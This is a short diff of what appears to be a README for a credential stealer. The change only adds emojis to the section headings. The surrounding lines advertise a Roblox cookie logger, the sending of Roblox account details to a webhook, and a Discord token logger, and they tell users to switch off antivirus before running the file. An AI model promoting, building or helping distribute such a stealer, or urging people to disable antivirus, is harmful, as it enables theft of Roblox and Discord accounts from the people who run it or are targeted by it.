@@ -4,12 +4,12 @@
 
 # Before The Steps Turn Off Antivirus Or The File Will Come Out With An ERROR Or Failed To Download Potential Virus Something Like That
 
-# Features
+# Features 🛡️
 1; Roblox Cookie Logger
 
 2; Roblox Info Such As Roblox Friends, Followers, Username And Gamepasses All Sent To Webhook 
 
-# Extra Features
+# Extra Features 🛡️🛡️
 
 1; Discord Token Logger
 
